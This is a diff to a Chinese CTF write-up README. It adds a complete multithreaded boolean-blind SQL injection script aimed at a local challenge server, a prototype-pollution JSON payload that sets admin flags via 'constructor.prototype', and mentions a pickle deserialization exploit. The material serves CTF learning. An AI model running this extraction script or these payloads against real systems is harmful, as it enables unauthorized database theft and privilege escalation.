@@ -1,4 +1,4 @@
-<img width="885" height="837" alt="image" src="https://github.com/user-attachments/assets/ba41de1f-640c-474e-9882-e1611913afa2" />## 查分系统
+## 查分系统
 直接看源码
 
 ## 归途
@@ -234,7 +234,8 @@ if __name__ == "__main__":
 ```
 
 ## 日志系统
-<img width="885" height="837" alt="image" src="https://github.com/user-attachments/assets/7201ad74-9c64-4a48-824d-1e3606b40b70" />  
+<img width="600"  alt="image" src="https://github.com/user-attachments/assets/7201ad74-9c64-4a48-824d-1e3606b40b70" />  
+
 发现可以导出日志，pkl后缀，审计源码app.py  
 考察python pickle反序列化，构造恶意序列化字符串，上传后即可获取flag  
 ```python
@@ -254,9 +255,148 @@ print(unquote(r.headers["Location"]))
 ```
 
 ## 江洋大盗
+输入1 and 1=1查询到了，1 and 1=2报错，判断是布尔盲注，黑名单禁用了union等关键词和字符  
+用AI写了个脚本  
+```python
+ import re
+import threading
+from concurrent.futures import ThreadPoolExecutor
+
+import requests
+
+URL = "http://127.0.0.1:29467/"
+WORKERS = 8
+MAX_LENGTH = 512
+
+local = threading.local()
+
+
+def oracle(condition):
+    if not hasattr(local, "session"):
+        local.session = requests.Session()
+
+    response = local.session.post(
+        URL,
+        data={"id": f"1 AND ({condition})"},
+        timeout=15,
+    )
+    response.raise_for_status()
+    return b"result-table" in response.content
+
+
+def extract(expr):
+    lo, hi = 0, 1
+    while hi <= MAX_LENGTH and not oracle(f"length({expr})<={hi}"):
+        hi *= 2
+    if hi > MAX_LENGTH:
+        raise RuntimeError(f"长度超过限制：{expr}")
+
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if oracle(f"length({expr})<={mid}"):
+            hi = mid
+        else:
+            lo = mid + 1
+
+    length = lo
+
+    def get_char(pos):
+        lo, hi = 0, 127
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if oracle(f"ascii(substring({expr},{pos},1))<={mid}"):
+                hi = mid
+            else:
+                lo = mid + 1
+        return pos, chr(lo)
+
+    result = [""] * length
+    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
+        for pos, char in pool.map(get_char, range(1, length + 1)):
+            result[pos - 1] = char
+
+    return "".join(result)
+
+
+def sql_string(value):
+    return "'" + value.replace("\\", "\\\\").replace("'", "''") + "'"
+
+
+def sql_ident(value):
+    return "`" + value.replace("`", "``") + "`"
+
+
+def main():
+    database = extract("database()")
+    print(f"[+] 当前数据库：{database}")
+
+    tables_expr = (
+        "(select group_concat(table_name) "
+        "from information_schema.tables "
+        "where table_schema=database())"
+    )
+    tables = extract(tables_expr).split(",")
+    print(f"[+] 数据表：{', '.join(tables)}")
+
+    candidates = []
+    for table in tables:
+        columns_expr = (
+            "(select group_concat(column_name) "
+            "from information_schema.columns "
+            f"where table_schema=database() and table_name={sql_string(table)})"
+        )
+        columns = extract(columns_expr).split(",")
+        print(f"[+] {table} 列：{', '.join(columns)}")
+
+        for column in columns:
+            if re.search(r"flag|secret|token", column, re.I):
+                candidates.insert(
+                    0, (table, column)
+                )
+            else:
+                candidates.append((table, column))
+
+    seen = set()
+    for table, column in candidates:
+        if (table, column) in seen:
+            continue
+        seen.add((table, column))
+
+        expr = (
+            f"(select group_concat(cast({sql_ident(column)} as char)) "
+            f"from {sql_ident(database)}.{sql_ident(table)})"
+        )
+        try:
+            value = extract(expr)
+        except RuntimeError:
+            continue
+
+        match = re.search(r"[A-Za-z0-9_]*\{[^{}]+\}", value)
+        if match:
+            print(f"[+] Flag：{match.group(0)}")
+            return
+
+    print("[-] 没找到符合常见格式的 flag；请检查上面输出的表和列。")
+
+
+if __name__ == "__main__":
+    main()
+```
 
 ## 礼崩乐坏
+和**合乎周礼**一样，原型污染链，但是proto被过滤了，考虑使用constructor.prototype扁平字符串绕过，效果是一样的  
+```python
+{
+  "constructor.prototype.isAdmin": true,
+  "constructor.prototype.canReadFlag": true
+}
+
+```  
+<img width="968" height="675" alt="image" src="https://github.com/user-attachments/assets/4dd468c0-a4cd-4df6-b03c-4ad073d7f6f3" />  
+污染成功，拿到flag
+
 ## bblogin
+
 ## 我刚一提交就发现了三个问题
 ## 旧能源管理系统
 ## 黑市走私
